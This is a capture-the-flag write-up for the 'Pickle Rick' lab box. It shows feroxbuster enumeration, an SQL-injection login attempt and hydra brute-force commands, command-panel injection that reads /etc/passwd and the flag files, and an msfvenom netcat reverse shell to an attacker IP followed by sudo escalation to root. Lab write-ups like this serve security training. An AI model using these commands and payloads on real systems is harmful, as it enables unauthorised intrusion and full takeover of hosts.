# Pickle Rick

## `/`

Username:

Note to self, remember username!
Username: R1ckRul3s

## `robots.txt`

password: Wubbalubbadubdub

## Tools for page discovery

gobuster,ffuz,wfuzz, feroxbuster,

## Page Discovery

./feroxbuster -u <http://10.10.80.188> --no-recursion -vv --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt

```log
200        1l        1w       17c http://10.10.80.188/robots.txt
200       37l      110w     1062c http://10.10.80.188/index.html
302        0l        0w        0c http://10.10.80.188/denied.php
403       11l       32w      300c http://10.10.80.188/wp-forum.phps
403       11l       32w      290c http://10.10.80.188/.ht
403       11l       32w      291c http://10.10.80.188/.php
403       11l       32w      291c http://10.10.80.188/.htc
403       11l       32w      292c http://10.10.80.188/.html
200       25l       61w      882c http://10.10.80.188/login.php
403       11l       32w      291c http://10.10.80.188/.htm
403       11l       32w      295c http://10.10.80.188/.htgroup
403       11l       32w      300c http://10.10.80.188/.htaccess.bak
403       11l       32w      297c http://10.10.80.188/.htpasswds
403       11l       32w      296c http://10.10.80.188/.htpasswd
302        0l        0w        0c http://10.10.80.188/portal.php
403       11l       32w      294c http://10.10.80.188/.htuser
200       37l      110w     1062c http://10.10.80.188/
403       11l       32w      296c http://10.10.80.188/.htaccess
301        9l       28w      313c http://10.10.80.188/assets
403       11l       32w      300c http://10.10.80.188/server-status
```

## /login.php

```shell
curl 'http://10.10.80.188/login.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://10.10.80.188/login.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=funm129tnonpqil3s00p2rn6d0' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'username=R1ckRul3s&password=%27+OR+1%3D1--&sub=Login'
```

hydra -v -V -l R1ckRul3s -P /usr/share/wordlists/rockyou.txt 10.10.80.188 http-post "/login.php:username=^USER^&password=^PASS^:Invalid username or password."
hydra -v -V -l R1ckRul3s -P /usr/share/wordlists/rockyou.txt 10.10.114.54 http-post "/rest/user/login:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Invalid email or password."

## `/portal.php`

### first flag

since `cat` is disabled, we look at the file with with `less`
`less Sup3rS3cretPickl3Ingred.txt | grep ''`

first flag
`mr. meeseek hair`

### sudo -l

```log
Matching Defaults entries for www-data on ip-10-10-80-188.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-80-188.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

### User

`less /etc/passwd | grep ''`

```log
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
```

### Command panel

```bash
curl 'http://10.10.80.188/portal.php#' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://10.10.80.188/portal.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=funm129tnonpqil3s00p2rn6d0' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'command=ls&sub=Execute'
```

### Home directory

`cd /home && ls -la`

```bash
drwxrwxrwx  2 root   root   4096 Feb 10  2019 rick
drwxr-xr-x  4 ubuntu ubuntu 4096 Feb 10  2019 ubuntu
```

`less '/home/rick/second ingredients' | grep ''`

**result second flag**
`1 jerry tear`

### Reverse Shell + Vertical Privilege Escalation

Attacker machine:

```bash
# ip is the attacker's ip
msfvenom -p cmd/unix/reverse_netcat lhost=10.10.14.77 lport=4444 R
nc -lvp 4444
```

target machine

```bash
# run via Command Panel /portal.php
# paste msfvenom reverse-shell payload
```

Attacker machine

```bash
whoami
# > www-data
sudo bash
whoami
# > root
```

## 3rd flag

```bash
ls /
# shows 3rd.txt
cat 3rd.txt
```
